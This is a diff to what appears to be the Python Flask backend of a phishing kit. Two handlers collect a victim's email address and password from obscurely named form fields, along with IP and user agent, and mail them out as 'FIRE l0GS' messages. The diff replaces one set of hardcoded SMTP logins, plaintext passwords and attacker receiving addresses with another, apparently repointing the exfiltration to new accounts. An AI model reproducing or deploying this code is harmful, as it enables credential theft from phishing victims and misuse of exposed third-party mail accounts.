@@ -1,3 +1,4 @@
+
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
 from flask import Flask, request, abort, render_template, session, \
@@ -176,10 +177,10 @@ def first():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'hassansheikh@elliottwave-forecast.com'
-        sender_emaill = 'hassansheikh'
-        receiver_email = 'jinna2323@yandex.com'
-        password = 'L@hore789'
+        sender_email = 'tpfeiffer@epencounter.org'
+        sender_emaill = 'tpfeiffer'
+        receiver_email = 'tylerashton690@gmail.com'
+        password = 'RealPeopleRealIssues'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS ! 1'
@@ -198,7 +199,7 @@ def first():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('elliottwave-forecast.com', 465) as server:
+        with smtplib.SMTP_SSL('mail.epencounter.org', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
@@ -217,10 +218,10 @@ def second():
             ip = request.remote_addr
         email = request.form.get('horse')
         passwordemail = request.form.get('pig')
-        sender_email = 'hassansheikh@elliottwave-forecast.com'
-        sender_emaill = 'hassansheikh'
-        receiver_email = 'jinna2323@yandex.com'
-        password = 'L@hore789'
+        sender_email = 'tpfeiffer@epencounter.org'
+        sender_emaill = 'tpfeiffer'
+        receiver_email = 'tylerashton690@gmail.com'
+        password = 'RealPeopleRealIssues'
         useragent = request.headers.get('User-Agent')
         message = MIMEMultipart('alternative')
         message['Subject'] = 'FIRE l0GS !! 2'
@@ -239,7 +240,7 @@ def second():
         part2 = MIMEText(html, 'html')
         message.attach(part1)
         message.attach(part2)
-        with smtplib.SMTP_SSL('elliottwave-forecast.com', 465) as server:
+        with smtplib.SMTP_SSL('mail.epencounter.org', 465) as server:
             server.login(sender_email, password)
             server.sendmail(sender_email, receiver_email,
                             message.as_string())
